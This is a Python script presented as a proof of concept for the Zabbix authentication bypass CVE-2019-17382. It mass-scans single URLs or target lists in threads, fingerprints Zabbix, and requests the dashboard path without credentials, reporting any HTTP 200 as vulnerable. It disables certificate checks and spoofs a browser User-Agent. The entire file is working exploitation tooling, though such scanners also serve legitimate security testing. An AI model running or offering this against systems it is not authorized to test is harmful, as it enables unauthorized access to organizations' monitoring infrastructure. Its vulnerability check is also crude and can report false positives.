#!/bin/python3

import requests
import argparse
from concurrent.futures import ThreadPoolExecutor
from tqdm import tqdm
from urllib3 import disable_warnings
from urllib3.exceptions import InsecureRequestWarning

disable_warnings(InsecureRequestWarning)
headers = {
    'User-Agent': 'Mozilla/5.0 (Linux; Android 4.4.2; GT-I9500 Build/KOT49H) AppleWebKit/537.36 '
                  '(KHTML, like Gecko) Chrome/43.0.2357.93 Mobile Safari/537.36'
}

def CVE_2019_17382_detection(target):
    detect_zabbix = "Zabbix"
    vuln_path = "/zabbix.php?action=dashboard.view&dashboardid=1"
    retrieve_zabbix = requests.get(target, headers=headers, timeout=5, verify=False).text
    if detect_zabbix in retrieve_zabbix:
        check_vuln = requests.get(target + "/zabbix" + vuln_path, headers=headers, timeout=5, verify=False).status_code
        if check_vuln == 200:
            print(f"{target}{vuln_path} is vulnerable to CVE-2019-17382")

def progress_bar(target):
    try:
        CVE_2019_17382_detection(target)
    except Exception:
        pass

def CVE_2019_17382_scanner(target_file, num_threads):
    with open(target_file, 'r') as targ:
        urls = [t.strip() for t in targ]

    with ThreadPoolExecutor(max_workers=num_threads) as executor, tqdm(total=len(urls), desc="Scanning Targets") as pbar:
        futures = [executor.submit(progress_bar, url) for url in urls]
        for future in futures:
            try:
                future.result()
            except Exception:
                pass
            pbar.update(1)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="CVE-2019-17382 - A PoC for Zabbix Authentication Bypass")
    parser.add_argument("-u", "--url", help="Single URL to scan")
    parser.add_argument("-f", "--file", help="File containing multiple URLs to scan")
    parser.add_argument("-t", "--threads", type=int, default=5, help="Number of threads you wish to use")

    args = parser.parse_args()
    if args.url:
        CVE_2019_17382_detection(args.url)
    elif args.file:
        CVE_2019_17382_scanner(args.file, args.threads)
    else:
        parser.print_help()
